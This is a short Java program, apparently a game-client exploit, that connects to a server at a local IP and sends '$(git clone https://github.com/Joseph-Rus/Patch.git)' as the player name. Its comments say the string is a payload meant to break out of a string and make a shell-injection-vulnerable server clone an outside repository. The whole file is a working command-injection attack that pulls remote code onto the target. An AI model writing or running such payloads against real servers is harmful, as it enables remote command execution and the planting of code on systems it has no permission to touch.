import java.io.*;
import java.net.*;

public class MMORPGClient {
    private static final String SERVER_ADDRESS = "10.0.101.78"; // Your local IP
    private static final int    SERVER_PORT    = 12345;

    public static void main(String[] args) {
        try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {

            // 1. Read the server's request for a name
            System.out.println("Server says: " + in.readLine());

            // 2. This is the payload. 
            // We are trying to break out of the string and run a git command.
            // If the server is vulnerable to shell injection, this will clone the repo.
            String patchCommand = "$(git clone https://github.com/Joseph-Rus/Patch.git)";
            
            System.out.println("Sending payload: " + patchCommand);
            out.println(patchCommand);

            // 3. Keep the connection alive so we can see the server's response
            new Thread(() -> {
                try {
                    String serverMessage;
                    while ((serverMessage = in.readLine()) != null) {
                        System.out.println("SERVER: " + serverMessage);
                    }
                } catch (IOException e) {
                    System.out.println("Connection closed.");
                }
            }).start();

            // Keep main thread running
            while(true) { Thread.sleep(1000); }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}